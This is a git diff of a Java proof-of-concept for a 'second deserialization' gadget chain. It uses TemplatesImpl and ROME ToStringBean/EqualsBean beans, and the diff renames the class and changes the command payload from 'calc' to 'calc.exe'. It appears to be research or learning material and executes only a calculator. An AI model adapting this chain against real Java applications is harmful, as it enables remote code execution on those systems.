@@ -1,18 +1,11 @@
 package Seri;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.syndication.feed.impl.EqualsBean;
 import com.sun.syndication.feed.impl.ObjectBean;
 import com.sun.syndication.feed.impl.ToStringBean;
 
 import javax.xml.transform.Templates;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.Signature;
@@ -22,9 +15,9 @@ import java.util.HashMap;
 import static Seri.Utils.*;
 
 // https://tttang.com/archive/1701/
-public class 二次反序列化 {
+public class TwiceUnserialize {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc.exe");
 
         ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
         ToStringBean fakeToStringBean = new ToStringBean(Templates.class,new TemplatesImpl());
@@ -53,8 +46,8 @@ public class 二次反序列化 {
         HashMap finalMap = new HashMap();
         finalMap.put(finalEqualBean,"123");
 
-        serialize(finalMap ,"bin/二次反序列化.bin");
-        unserialize("bin/二次反序列化.bin");
+        serialize(finalMap ,"bin/TwiceUnserialize.bin");
+        unserialize("bin/TwiceUnserialize.bin");
 
     }
 }
